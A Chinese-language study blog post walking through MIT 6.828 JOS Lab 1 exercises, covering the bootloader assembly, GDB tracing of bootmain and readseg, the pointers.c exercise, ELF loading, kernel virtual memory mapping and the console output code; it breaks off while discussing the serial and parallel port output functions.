<p>追踪到bootmain函数中，而且还要具体追踪到readsect()子函数里面。找出和readsect()c语言程序的每一条语句所对应的汇编指令，回到bootmain()，然后找出把内核文件从磁盘读取到内存的那个for循环所对应的汇编语句。找出当循环结束后会执行哪条语句，在那里设置断点，继续运行到断点，然后运行完所有的剩下的语句。</p>
<p>首先查看boot.S文件，在开头可以看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">start:</div><div class="line">  .code16                     # 16位汇编模式</div><div class="line">  cli                         # 关中断</div><div class="line">  cld                         # String operations increment</div></pre></td></tr></table></figure>
<p><code>cld</code> 是串操作指令，用来操作方向标志位DF，使DF=0。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># Set up the important data segment registers (DS, ES, SS).</div><div class="line">xorw    %ax,%ax             # Segment number zero</div><div class="line">movw    %ax,%ds             # -&gt; Data Segment</div><div class="line">movw    %ax,%es             # -&gt; Extra Segment</div><div class="line">movw    %ax,%ss             # -&gt; Stack Segment</div></pre></td></tr></table></figure>
<p>将DS、ES、SS寄存器清零。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">  # Enable A20:</div><div class="line">  #   For backwards compatibility with the earliest PCs, physical</div><div class="line">  #   address line 20 is tied low, so that addresses higher than</div><div class="line">  #   1MB wrap around to zero by default.  This code undoes this.</div><div class="line">seta20.1:</div><div class="line">  inb     $0x64,%al               # Wait for not busy</div><div class="line">  testb   $0x2,%al</div><div class="line">  jnz     seta20.1</div><div class="line"></div><div class="line">  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64</div><div class="line">  outb    %al,$0x64</div><div class="line"></div><div class="line">seta20.2:</div><div class="line">  inb     $0x64,%al               # Wait for not busy</div><div class="line">  testb   $0x2,%al</div><div class="line">  jnz     seta20.2</div><div class="line"></div><div class="line">  movb    $0xdf,%al               # 0xdf -&gt; port 0x60</div><div class="line">  outb    %al,$0x60</div></pre></td></tr></table></figure>
<p>开启A20，关于为什么要开A20,可以看<a href="https://www.zhihu.com/question/29375534" target="_blank" rel="external">知乎:OS boot 的时候为什么要 enable A20？</a>。</p>
<p><code>inb     $0x64,%al</code> 把0x64端口(8042键盘控制器)的状态写入al中（inb代表IO端口读）, 之后 <code>testb   $0x2,%al</code> 判断al的第二位是否为0，不为0就循环执行seta20.1。这里第二位代表输入缓冲区是否满了。接着0xd1放入0x64端口。最后将0xdf放入0x60端口，代表开启A20地址线了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># Switch from real to protected mode, using a bootstrap GDT</div><div class="line"># and segment translation that makes virtual addresses </div><div class="line"># identical to their physical addresses, so that the </div><div class="line"># effective memory map does not change during the switch.</div><div class="line">lgdt    gdtdesc</div><div class="line">movl    %cr0, %eax</div><div class="line">orl     $CR0_PE_ON, %eax</div><div class="line">movl    %eax, %cr0</div></pre></td></tr></table></figure>
<p>切换到保护模式后，加载GDT(Global Descriptor Table)，接着修改了cr0寄存器的值，$CR0_PE_ON值为0x1，代表启动保护模式的flag标志。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Jump to next instruction, but in 32-bit code segment.</div><div class="line"># Switches processor into 32-bit mode.</div><div class="line">ljmp    $PROT_MODE_CSEG, $protcseg</div></pre></td></tr></table></figure>
<p>也就是 <code>0x7c2d:    ljmp   $0x8,$0x7c32</code> 跳转到了32位代码段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">protcseg:</div><div class="line">  # Set up the protected-mode data segment registers</div><div class="line">  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector</div><div class="line">  movw    %ax, %ds                # -&gt; DS: Data Segment</div><div class="line">  movw    %ax, %es                # -&gt; ES: Extra Segment</div><div class="line">  movw    %ax, %fs                # -&gt; FS</div><div class="line">  movw    %ax, %gs                # -&gt; GS</div><div class="line">  movw    %ax, %ss                # -&gt; SS: Stack Segment</div></pre></td></tr></table></figure>
<p>修改了这些寄存器的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Set up the stack pointer and call into C.</div><div class="line">movl    $start, %esp</div><div class="line">call bootmain</div></pre></td></tr></table></figure>
<p>设置栈指针，接着开始调用bootmain函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">7d15:	55                   	push   %ebp</div><div class="line">7d16:	89 e5                	mov    %esp,%ebp</div><div class="line">7d18:	56                   	push   %esi</div><div class="line">7d19:	53                   	push   %ebx</div></pre></td></tr></table></figure>
<p>首先做进入函数的准备工作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">// read 1st page off disk</div><div class="line">readseg((uint32_t) ELFHDR, SECTSIZE*8, 0);</div><div class="line">   7d1a:	6a 00                	push   $0x0</div><div class="line">   7d1c:	68 00 10 00 00       	push   $0x1000</div><div class="line">   7d21:	68 00 00 01 00       	push   $0x10000</div><div class="line">   7d26:	e8 b1 ff ff ff       	call   7cdc &lt;readseg&gt;</div></pre></td></tr></table></figure>
<p>接着调用readseg函数，这个函数有3个参数，第一个是物理地址，第二个是页的大小，第三个是偏移量。</p>
<p><code>0x7ceb:    shr    $0x9,%edi</code> 执行了 <code>offset = (offset / SECTSIZE) + 1;</code> 这条代码前面的除法部分，得出扇区号。</p>
<p><code>0x7cee:    add    %ebx,%esi</code> 执行了 <code>end_pa = pa + count;</code> 计算出这个扇区结束的物理地址。</p>
<p><code>0x7cf0:    inc    %edi</code> 执行了 <code>offset = (offset / SECTSIZE) + 1;</code> 中的加1。</p>
<p><code>0x7cf1:    and    $0xfffffe00,%ebx</code> 执行了 <code>pa &amp;= ~(SECTSIZE - 1);</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x7cf7:	cmp    %esi,%ebx0x7cf9:	jae    0x7d0d</div></pre></td></tr></table></figure>
<p>执行 <code>while (pa &lt; end_pa)</code> 这个循环判断语句。</p>
<p>之后几条汇编是为readsect函数做准备，这个函数是读取扇区内容的。</p>
<p><img src="3.png" alt=""></p>
<p>判断 <code>ELFHDR-&gt;e_magic != ELF_MAGIC</code> 这个条件。</p>
<p><img src="4.png" alt=""></p>
<p>加载程序段由这几个部分汇编构成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">7d3a:	a1 1c 00 01 00       	mov    0x1001c,%eax</div><div class="line">7d3f:	0f b7 35 2c 00 01 00 	movzwl 0x1002c,%esi</div><div class="line">7d46:	8d 98 00 00 01 00    	lea    0x10000(%eax),%ebx</div><div class="line">7d4c:	c1 e6 05             	shl    $0x5,%esi</div><div class="line">7d4f:	01 de                	add    %ebx,%esi</div></pre></td></tr></table></figure>
<p>之后循环调用readseg函数，将Program Header Table中表项读入内存。</p>
<p>最后一步就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((void (*)(void)) (ELFHDR-&gt;e_entry))();</div></pre></td></tr></table></figure>
<p>至此，Exercise 3算是走了一遍过程。</p>
<h3 id="u52A0_u8F7D_u5185_u6838"><a href="#u52A0_u8F7D_u5185_u6838" class="headerlink" title="加载内核"></a>加载内核</h3><h4 id="Exercise_4"><a href="#Exercise_4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><p>阅读 K&amp;R 的 <em>The C Programming Language</em>， 理解 <a href="https://pdos.csail.mit.edu/6.828/2016/labs/lab1/pointers.c" target="_blank" rel="external">pointers.c</a>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> a[<span class="number">4</span>];</div><div class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">16</span>);</div><div class="line"><span class="keyword">int</span> *c;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"1: a = %p, b = %p, c = %p\n"</span>, a, b, c);</div></pre></td></tr></table></figure>
<p>结果是 <code>1: a = 0x7fff5fbff810, b = 0x100600000, c = 0x100000000</code></p>
<p>a是数组，所以输出的0x7fff5fbff810是数组a的首地址。b是指针，指向malloc分配的空间的起始地址0x100600000。c是未定义的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">c = a;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</div><div class="line">    a[i] = <span class="number">100</span> + i;</div><div class="line">c[<span class="number">0</span>] = <span class="number">200</span>;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"2: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span>,</div><div class="line">           a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</div></pre></td></tr></table></figure>
<p><code>c = a;</code> 让指针c指向a指向的地址。先是for循环，给数组a赋值为100、101、102、103。因为c现在和a指向同一区域，所以c[0]修改的是数组a的第一个元素，所以结果是 <code>2: a[0] = 200, a[1] = 101, a[2] = 102, a[3] = 103</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">c[<span class="number">1</span>] = <span class="number">300</span>;</div><div class="line">*(c + <span class="number">2</span>) = <span class="number">301</span>;</div><div class="line"><span class="number">3</span>[c] = <span class="number">302</span>;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"3: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span>,</div><div class="line">           a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</div></pre></td></tr></table></figure>
<p>三种修改数组中值的方法，其中第三种没怎么见过，有点像汇编里地址偏移的方式，3[c]就是c的地址偏移到第三个元素的地址，所以输出为 <code>3: a[0] = 200, a[1] = 300, a[2] = 301, a[3] = 302</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">c = c + <span class="number">1</span>;</div><div class="line">*c = <span class="number">400</span>;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"4: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span>,</div><div class="line">           a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</div></pre></td></tr></table></figure>
<p>移动指针指向了数组的第二个元素，所以输出为 <code>4: a[0] = 200, a[1] = 400, a[2] = 301, a[3] = 302</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">c = (<span class="keyword">int</span> *) ((<span class="keyword">char</span> *) c + <span class="number">1</span>);</div><div class="line">*c = <span class="number">500</span>;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"5: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span>,</div><div class="line">           a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</div></pre></td></tr></table></figure>
<p><code>c = (int *) ((char *) c + 1);</code> 这一行代码先将c强制转型为char指针，接着指针加1，再强转回int指针。一步一步来看，首先可以确定在执行这行代码之前，c的地址为 0x7fff5fbff814(因为系统是64位的，其实地址为 0x00007fff5fbff814，只不过前面的0省略了)，所以强转为char指针后加1得到的地址为 0x7fff5fbff815，因为char只占一个字节。因为c原来值为400，也就是十六进制的0x190.在c强转之前，打印 (char <em>) c 的地址为 0x7fff5fbff814，查看 </em>(char *) c 的值为 ffffff90。这里要说明一下，为什么90前面都是ffffff，这不是fff团对单身狗的报复，而是 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">"%x\n"</span>, *(<span class="keyword">char</span> *)c);</div></pre></td></tr></table></figure>
<p>中，%x 将值强转为unsigned int，unsigned int在我的系统中占4个字节。所以打印出来有8位。用 <code>%c</code> 可以得到真正这个地方的值，只不过是八进制的。当然查看这个值最方便的还是声明个变量，然后在Xcode打断点进行查看。声明一个变量 <code>char *p= (char *)c;</code>, 使用 <code>p++</code> 进行单步调试，可以查看 <code>*p</code> 的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0x7fff5fbff814  0x90</div><div class="line">0x7fff5fbff815  0x01</div><div class="line">0x7fff5fbff816  0x0</div><div class="line">0x7fff5fbff817  0x0</div><div class="line">0x7fff5fbff818	2d</div><div class="line">0x7fff5fbff819	1</div><div class="line">0x7fff5fbff81a	0</div><div class="line">0x7fff5fbff81b	0</div></pre></td></tr></table></figure>
<p>500的十六进制是0x1F4, 因为char指针加1使指针指向 0x7fff5fbff815，所以修改其值为0xF4，0x7fff5fbff816为0x1，0x7fff5fbff818为0x0，所以a[1]值变为0x1F490=128144，a[2]为0x100=256。所以输出 <code>a[0] = 200, a[1] = 128144, a[2] = 256, a[3] = 302</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">b = (int *) a + 1;</div><div class="line">c = (int *) ((char *) a + 1);</div><div class="line">printf(&quot;6: a = %p, b = %p, c = %p\n&quot;, a, b, c);</div></pre></td></tr></table></figure>
<p>b是int指针，所以a + 1即a的地址加上sizeof(int *)也就是4，所以指向a[1]。而c参考上一段的介绍，可知道是在char指针情况下进行加1，所以地址偏移1。所以输出 <code>6: a = 0x7fff5fbff810, b = 0x7fff5fbff814, c = 0x7fff5fbff811</code>。</p>
<p>接着就可以来学习内核。为了理解 <code>boot/main.c</code>， 需要了解ELF二进制文件。编译并链接比如JOS内核这样的C程序，编译器会将源文件(.c)转为包含汇编指令的目标文件(.o)。接着链接器把所有的目标文件组合成一个单独的二进制镜像（binary image），比如 <code>obj/kern/kernel</code>，这种文件就是ELF(是可执行可链接形式的缩写)。</p>
<p>当前只需要知道，可执行的ELF文件由带有加载信息的头，多个程序段表组成。每个程序段表是一个连续代码块或者数据，它们要被加载到内存具体地址中。boot loader 不修改源码和数据，直接加载到内存中并运行。</p>
<p>ELF开头是固定长度的 <em>ELF头</em>，之后是一个可变长度的程序头，它列出了需要加载的程序段。ELF头的定义在 <code>inc/elf.h</code> 中。主要学习以下3个程序段：</p>
<ul>
<li>.text: 程序执行指令</li>
<li>.rodata:只读数据，比如ASCII字符串</li>
<li>.data: 存放程序初始化的数据段，比如有初始值的全局变量。</li>
</ul>
<p>当链接器计算程序内存布局时，会在内存里紧挨着.data段的.bss段中保留空间给未初始化的全局变量。C规定未初始化的全局变量为0。因此没必要在ELF的.bss段储存内容，链接器只储存了.bss段的地址和大小。</p>
<p>使用 <code>objdump -h obj/kern/kernel</code> 可以查看ELF头的相关信息。</p>
<p><img src="5.png" alt=""></p>
<p>重点关注 .text段 的VMA(链接地址)和LMA(加载地址)，段的加载地址即加载进内存的地址。段的链接地址就是这个段预计在内存中执行的地址。链接程序有多种编码链接地址的方法。通常链接和加载的地址是一致的。查看boot loader的 .text段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -h obj/boot/boot.out</div></pre></td></tr></table></figure>
<p><img src="6.png" alt=""></p>
<p>boot loader使用 <em>ELF程序头(Program Headers)</em> 确定如何加载段。程序头指明ELF中哪部分加载进内存和其所在的地址。使用一下命令查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -x obj/kern/kernel</div></pre></td></tr></table></figure>
<p><img src="7.png" alt=""></p>
<p>其中Program Headers下面列出的程序头中，开头的LOAD代表已经加载到内存中了，另外显示出了虚拟地址(vaddr)，物理地址(paddr)以及存放区域的大小(memsz和filesz)。</p>
<p>回到 <code>boot/main.c</code>， ph-&gt;p_pa是每个程序头包含的段目的物理地址。</p>
<p>BIOS把引导扇区加载到内存地址0x7c00，这也就是引导扇区的加载地址和链接地址。在 <code>boot/Makefrag</code> 中，是通过传 -Ttext 0x7C00 这个参数给链接程序设置了链接地址，因此链接程序在生成的代码中产生正确的内存地址。</p>
<h4 id="Exercise_5"><a href="#Exercise_5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><p>修改 <code>boot/Makefrag</code> 让其加载地址出错。查看这个文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$(OBJDIR)/boot/boot: $(BOOT_OBJS)</div><div class="line">	@echo + ld boot/boot</div><div class="line">	$(V)$(LD) $(LDFLAGS) -N -e start -Ttext 0x7C00 -o $@.out $^</div><div class="line">	$(V)$(OBJDUMP) -S $@.out &gt;$@.asm</div><div class="line">	$(V)$(OBJCOPY) -S -O binary -j .text $@.out $@</div><div class="line">	$(V)perl boot/sign.pl $(OBJDIR)/boot/boot</div></pre></td></tr></table></figure>
<p>可以发现 -Ttext 后面的参数就是入口地址。如果把这个值修改为0x8C00，保存后回到lab1文件夹下进行make，查看 <code>obj/boot/boot.asm</code> 会发现，开头</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00008c00 &lt;start&gt;:</div><div class="line">.set CR0_PE_ON,      0x1         # protected mode enable flag</div><div class="line"></div><div class="line">.globl start</div><div class="line">start:</div><div class="line">  .code16                     # Assemble for 16-bit mode</div><div class="line">  cli                         # Disable interrupts</div><div class="line">    8c00:	fa                   	cli    </div><div class="line">  cld                         # String operations increment</div><div class="line">    8c01:	fc                   	cld</div></pre></td></tr></table></figure>
<p>可以发现起始地址从原来的 00007c00 变为 00008c00。虽然此时在0x7c00处打断点然后运行时正常的，但是继续si以后会在 <code>[   0:7c2d] =&gt; 0x7c2d:    ljmp   $0x8,$0x8c32</code> 出循环，同时qemu端口出现了错误。因为不能ljmp到$0x7c32而是调到了$0x8c32，所以无法执行正确的指令。查看 <code>boot.asm</code> 可以知道上面这个指令是 <code>ljmp    $PROT_MODE_CSEG, $protcseg</code>，是为了进入32位模式的。</p>
<p>除了段信息，ELF头中的e_entry字段也很重要。这个字段保存了程序入口点(entry point)的链接地址，也就是程序执行的text字段中的内存地址。使用一下命令查看<code>objdump -f obj/kern/kernel</code></p>
<p><img src="8.png" alt=""></p>
<h4 id="Exercise_6"><a href="#Exercise_6" class="headerlink" title="Exercise 6"></a>Exercise 6</h4><p>使用GDB的 <code>x/Nx ADDR</code> 可以打印内存地址ADDR的 <em>N</em> 个字。字的大小分情况的，GDB中一个字是两个字节。</p>
<p>查看BIOS启动时0x00100000处的8歌字，然后继续到boot loader进入内核的位置，再查看，发现8个字的内容不同。</p>
<p>现在0x7c00处打断点，然后运行到断点处，使用 <code>x/8x 0x100000</code> 可以看到</p>
<p><img src="9.png" alt=""></p>
<p>根据之前的看到程序入口点是 0x10000c ，所以在 0x10000c 处打断点运行，同样可以看到</p>
<p><img src="10.png" alt=""></p>
<p>使用 <code>x/10i 0x100000</code> 会看到</p>
<p><img src="11.png" alt=""></p>
<p>应该能感觉到 0x100000 处存放的其实就是程序指令段，也就是说 bootmain 函数会把内核的程序段送到内存 0x100000 处。</p>
<h2 id="Part_3_3A_The_Kernel"><a href="#Part_3_3A_The_Kernel" class="headerlink" title="Part 3: The Kernel"></a>Part 3: The Kernel</h2><h3 id="u4F7F_u7528_u865A_u62DF_u5185_u5B58"><a href="#u4F7F_u7528_u865A_u62DF_u5185_u5B58" class="headerlink" title="使用虚拟内存"></a>使用虚拟内存</h3><p>boot loader 的链接地址和加载地址是一样的，然而 kernel 的链接地址和加载地址有些差异。查看 <code>kern/kernel.ld</code> 可以发现内核地址在 0xF0100000。</p>
<p>操作系统内核通常被链接并且运行在非常高的虚拟地址，比如文件里看到的 0xf0100000，为了让处理器虚拟地址空间的低地址部分给用户程序使用。</p>
<p>许多机器没有地址为 0xf0100000 的物理内存，所以内核不能放在那儿。因此使用处理器内存管理硬件将虚拟地址 0xf0100000 (内核希望运行的链接地址)映射到物理地址 0x00100000 (boot loader加载内核后所放的物理地址)。尽管内核虚拟地址很高，但加载进物理地址位于1MB的地方仅仅高于BIOS的ROM。这需要PC至少有1MB的物理内存。</p>
<p>在下一个lab，会映射物理地址空间底部256MB，也就是 0x00000000 到 0x0fffffff，到虚拟地址 0xf0000000 ~ 0xffffffff。所以JOS只使用物理内存开始的256MB。</p>
<p>目前，只是映射了物理内存开始的4MB， 使用手写的静态初始化页目录和也表在 <code>kern/entrypgdir.c</code>。当 <code>kern/entry.S</code> 设置 <code>CR0_PG</code> 标记，存储器引用就变为虚拟地址，即存储器引用是由虚拟存储器硬件转换为物理地址的虚拟地址。<code>entry_pgdir</code> 将虚拟地址 0xf0000000 ~ 0xf0400000 转换为物理地址 0x00000000 ~ 0x00400000，虚拟地址 0x00000000 ~ 0x00400000 也转换为物理地址 0x00000000 ~ 0x00400000。任何不在这两个范围内的虚拟地址会导致硬件异常。</p>
<h4 id="Exercise_7"><a href="#Exercise_7" class="headerlink" title="Exercise 7"></a>Exercise 7</h4><p>追踪JOS内核并停在 <code>movl %eax, %cr0</code>。查看内存 0x00100000 和 0xf0100000。接着使用 <code>stepi</code> 来看上面两个地址里内容的变化。</p>
<p>若注释了 <code>kern/entry.S</code> 的 <code>movl %eax, %cr0</code>, 查看第一个出现问题的指令是什么。</p>
<p>查看 <code>kern/entry.S</code> 发现 <code>_start</code> 是ELF入口点，exercise 5 提到了入口点是 0x0010000c. 所以在0x0010000c处打断点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) b *0x0010000c</div></pre></td></tr></table></figure>
<p>接着输入 <code>c</code> 使程序运行到断点处。使用 <code>x/4i</code> 来查看后四条指令,发现 0x00100000 和 0xf0100000 不同。</p>
<p><img src="12.png" alt=""></p>
<p>在执行完6次si后，终于 0x00100000 和 0xf0100000 处内容相同。</p>
<p><img src="13.png" alt=""></p>
<p>也就是说，0xf0100000 的内容被映射到 0x00100000。</p>
<p>注释 <code>movl %eax, %cr0</code> 后，<code>make clean</code> 之后重新编译，再运行。一步步 si 后出现了问题。</p>
<p><img src="14.png" alt=""></p>
<p>在0x10002a处的jmp指令，要跳到 0xf010002c 处， 然而因为没有分页管理，不会进行虚拟地址映射到物理地址的转化，再另一个窗口可以看到错误信息，访问地址超出内存。</p>
<p><img src="15.png" alt=""> </p>
<h3 id="u683C_u5F0F_u5316_u8F93_u51FA_u5230_u63A7_u5236_u53F0"><a href="#u683C_u5F0F_u5316_u8F93_u51FA_u5230_u63A7_u5236_u53F0" class="headerlink" title="格式化输出到控制台"></a>格式化输出到控制台</h3><p>分析 <code>kern/printf.c</code>, <code>lib/printfmt.c</code>, 和 <code>kern/console.c</code> 的代码。</p>
<h4 id="Exercise_8"><a href="#Exercise_8" class="headerlink" title="Exercise 8"></a>Exercise 8</h4><p>完成指定输出”%o”格式字符串的代码。</p>
<p>首先分析 <code>kern/printf.c</code>, <code>lib/printfmt.c</code>, 和 <code>kern/console.c</code> 的关系。</p>
<p><code>kern/printf.c</code>里的 <code>vcprintf</code>, <code>cprintf</code> 都调用 <code>lib/printfmt.c</code> 的 <code>vprintfmt</code>。<code>kern/printf.c</code>里的 <code>putch</code> 调用 <code>kern/console.c</code> 的 <code>cputchar</code>。<code>lib/printfmt.c</code> 里也有 <code>putch</code>。</p>
<p>所以 <code>kern/printf.c</code> 和 <code>lib/printfmt.c</code> 依赖 <code>kern/console.c</code>。</p>
<p>首先先看看 <code>putch</code> 里调用的 <code>cputchar</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 'High'-level console I/O.  Used by readline and cprintf.</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">cputchar</span><span class="params">(<span class="keyword">int</span> c)</span></div><div class="line">&#123;</div><div class="line">	cons_putc(c);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// output a character to the console</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">cons_putc</span><span class="params">(<span class="keyword">int</span> c)</span></div><div class="line">&#123;</div><div class="line">	serial_putc(c);</div><div class="line">	lpt_putc(c);</div><div class="line">	cga_putc(c);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>cputchar</code>调用的是 <code>cons_putc</code>, 所以 <code>cons_putc</code> 才是关键。 <code>cons_putc</code> 的功能是输出一个字符到控制台。<code>cons_putc</code> 又是由 <code>serial_putc</code>， <code>lpt_putc</code> 和 <code>cga_putc</code> 组成。</p>
<p>因此，要先来看 <code>serial_putc</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#define COM1		0x3F8</div><div class="line">#define COM_LSR		5	// In:	Line Status Register</div><div class="line">#define   COM_LSR_TXRDY	0x20	//   Transmit buffer avail</div><div class="line">#define COM_TX		0	// Out: Transmit buffer (DLAB=0)</div><div class="line"></div><div class="line">static void</div><div class="line">serial_putc(int c)</div><div class="line">&#123;</div><div class="line">	int i;</div><div class="line"></div><div class="line">	for (i = 0;</div><div class="line">	     !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; 12800;</div><div class="line">	     i++)</div><div class="line">		delay();</div><div class="line"></div><div class="line">	outb(COM1 + COM_TX, c);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>它控制的是端口0x3F8，inb 读取的是 COM1 + COM_LSR = 0x3FD 端口，outb 输出到了 COM1 + COM_TX = 0x3F8。</p>
<p>详细端口信息查看这个<a href="http://bochs.sourceforge.net/techspec/PORTS.LST" target="_blank" rel="external">PORTS.LST</a>。</p>
<p>在 inb(COM1 + COM_LSR) 之后， 有 &amp; COM_LSR_TXRDY 这个操作。 <code>!(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY)</code> 其实是为了查看读入的数据的第6位，也就是 PORTS.LST 中 03FD 中提到的 bit 5 是否为1。 如果为1，上面的语句结果就是0，停止for循环。这个 bit 5 是判断发送数据缓冲寄存器是否为空。</p>
<p>outb 是将端口 0x3F8 的内容输出到 c。当 0x3F8 被写入数据，它作为发送数据缓冲寄存器，数据是要发给串口。</p>
<p>所以serial_putc是为了把一个字符输出到串口。</p>
<p>再来看 <code>lpt_putc</code>。</p>
